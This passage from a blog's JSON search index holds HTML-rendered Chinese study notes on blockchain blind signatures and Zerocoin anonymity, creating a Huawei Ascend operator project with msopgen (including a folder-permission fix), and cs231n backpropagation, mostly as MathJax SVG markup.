data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1725,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2215,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的值</li>\n<li>扩展到多项式</li>\n</ul></li>\n</ul>\n<h3 id=\"盲签方法\">盲签方法</h3>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250120211358259.png\" alt=\"image-20250120211358259\">\n<figcaption aria-hidden=\"true\">image-20250120211358259</figcaption>\n</figure>\n<p>主要有一个不懂的点是，如何在不知道具体内容的情况下对他签名</p>\n<h3 id=\"零币和零钞\">零币和零钞</h3>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250120211655062.png\" alt=\"image-20250120211655062\">\n<figcaption aria-hidden=\"true\">image-20250120211655062</figcaption>\n</figure>\n<p>课上不详细讲2333数学原理很复杂</p>\n<p>但是和现实中的实体交互的时候，仍然不能保证百分百匿名</p>\n<h1 id=\"思考\">思考</h1>\n<blockquote>\n<p>不要被学术界的思维限制了头脑，不要被程序员的思维限制了想象力</p>\n</blockquote>\n<p>很多理论上不可能的模型仅仅存在于理论上。现实中有很多更简单、直接的方案把这个不可能模型变为可能。</p>\n","categories":["笔记"],"tags":["区块链","毕设","比特币"]},{"title":"Ascend 学习笔记 05 - 项目准备","url":"/Ascend/05-S5%E8%B5%9B%E5%AD%A3/","content":"<p>备忘，记一下创建项目的过程。</p>\n<span id=\"more\"></span>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGlhc2NlbmQuY29tL2RvY3VtZW50L2RldGFpbC96aC9DQU5OQ29tbXVuaXR5RWRpdGlvbi84MVJDMWJldGExL2RldmFpZHMvb3B0b29sL2F0bGFzb3BkZXZfMTZfMDAyMS5odG1s\">创建算子工程<i class=\"fa fa-external-link-alt\"></i></span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">msopgen gen -i ReduceLogSumExp.json -f pytorch -c ai_core-ascend310b -lan cpp -out ./ReduceLogSumExp</span><br></pre></td></tr></table></figure>\n<p>可能会报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">msopgen gen -i ReduceLogSumExp.json -f pytorch -c Ascend310B1 -lan cpp -out ./ReduceLogSumExp</span><br><span class=\"line\">2025-06-03 20:21:48 (153799) - [ERROR] The path /home/HwHiAiUser/Basic-S5 should not be written by user group or others, which will cause security risks </span><br></pre></td></tr></table></figure>\n<p>是因为文件夹权限太宽松，执行如下命令后，重新msopgen</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 755 .</span><br></pre></td></tr></table></figure>\n","categories":["笔记"],"tags":["AI","硬件加速","Ascend"]},{"title":"cs231n - 反向传播","url":"/cs231n/02/","content":"<p>反向传播，课程看完了就是链式法则求导，没做笔记，做作业的时候记一下。</p>\n<p>核心还是看最后的数学补充。</p>\n<span id=\"more\"></span>\n<h1 id=\"全连接网络的反向传播\">全连接网络的反向传播</h1>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"13.627ex\" height=\"1.756ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 6023 776\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(485,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1057,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1695.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2751.6,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3323.6,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4593.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5594,0)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></svg></mjx-container></span></p>\n<p>已知 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.817ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.571ex\" height=\"2.852ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -899.6 5114.5 1260.7\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1005,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1577,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2215.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(3271.6,0)\"><g data-mml-node=\"mrow\" transform=\"translate(480.6,394) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1051,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1623,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g></g><rect width=\"1602.9\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> ，反向传播要求 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.471ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 1092 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g></g></svg></mjx-container></span>,\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.05ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.548ex\" height=\"1.62ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 1568 716\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g></g></g></svg></mjx-container></span>, <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.147ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 949 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></svg></mjx-container></span> ，shape应该分别和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.294ex\" height=\"1.025ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 572 453\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g></g></svg></mjx-container></span> <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.05ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.371ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 1048 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g></g></g></svg></mjx-container></span>\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"0.971ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 429 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></svg></mjx-container></span> 相同。 <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.602ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"36.136ex\" height=\"4.749ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1391 15972.1 2099\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 